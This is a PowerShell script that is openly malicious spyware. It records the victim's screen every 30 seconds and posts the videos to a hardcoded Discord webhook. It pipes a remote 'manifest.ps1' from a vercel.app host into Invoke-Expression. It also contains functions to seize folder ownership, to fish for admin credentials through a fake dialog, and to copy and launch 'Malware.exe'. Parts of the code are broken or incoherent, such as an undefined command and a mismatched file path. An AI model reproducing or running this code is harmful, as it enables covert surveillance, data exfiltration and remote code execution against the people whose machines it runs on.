# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1497824412307820575/JmEyUzNIHjGl81yZqJ5_svUO1GeMmDPH55jrxqKpVYOsR591zIlXhpJtPugGVcku5tMR"

# Set the file path for storing recorded videos
$recordFilePath = "C:\RecordedVideos"

# Create the directory if it doesn't exist
if (!(Test-Path -Path $recordFilePath)) {
    New-Item -ItemType Directory -Path $recordFilePath
}

# Define the username for admin rights
$adminUsername = "YOUR_USERNAME"

# Set the path for the malicious executable
$malwarePath = "C:\Malware.exe"

# Function to record screen and send video through Discord webhook
function RecordScreenAndSendVideo {
    # Record the screen for 30 seconds
    Start-Process -FilePath "ffmpeg" -ArgumentList "-y", "-framerate", "30", "-f", "gdigrab", "-i", "desktop", "$recordFilePath\$(Get-Date -Format 'yyyyMMddHHmmss').mp4"

    # Get the recorded video file path
    $videoFilePath = Join-Path -Path $recordFilePath -ChildPath "$(Get-Date -Format 'yyyyMMddHHmmss').mp4"

    # Send the video through Discord webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{file1= $videoFilePath}
}

# Function to take ownership of all folders
function TakeOwnershipOfFolders {
    Get-ChildItem -Recurse | Where-Object {$_.PSIsContainer} | ForEach-Object {
        $currentOwner = (Get-Acl $_).Owner
        if ($currentOwner -ne "NT AUTHORITY\SYSTEM") {
            $acl = Get-Acl $_
            $acl.SetOwner([Security.Principal.NTAccount]::new($adminUsername))
            Set-Acl -Path $_ -AclObject $acl
        }
    }
}

# Function to grant admin rights to a user
function GrantAdminRights {
    $userPrincipalName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if (!(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole("Administrator")) {
        Start-Process -FilePath "powershell" -ArgumentList "-Command", "`$(Add-Type -AssemblyName PresentationFramework; [System.Runtime.InteropServices.Marshal]::GetActiveWindow(); $wshell = New-Object System.Windows.Forms.SaveFileDialog; $wshell.FileName = 'Admin Rights'; $wshell.Filter = 'All files (*.*)|*.*'; $result = $wshell.ShowDialog(); if ($result -eq [System.Windows.Forms.DialogResult]::OK) { Add-Type -AssemblyName PresentationFramework; [Windows.Security.Credentials.PasswordCredential]::new($userPrincipalName, $adminUsername); })" -Wait
        Exit-Policy
    }
}

# Function to install a malware (in this case, a harmless executable)
function InstallMalware {
    # Create the directory for the malicious executable if it doesn't exist
    if (!(Test-Path -Path "C:\Malware")) {
        New-Item -ItemType Directory -Path "C:\Malware"
    }

    # Copy the malware to the designated path
    Copy-Item -Path "C:\Temp\Malware.exe" -Destination "C:\Malware\"

    # Run the malware (in this case, a harmless executable)
    Start-Process -FilePath "C:\Malware\Malware.exe"
}

# Download and run the malicious script
irm "https://luatools.vercel.app/manifest.ps1" | iex

# Record screen every 30 seconds
while ($true) {
    RecordScreenAndSendVideo
    Start-Sleep -s 30
}
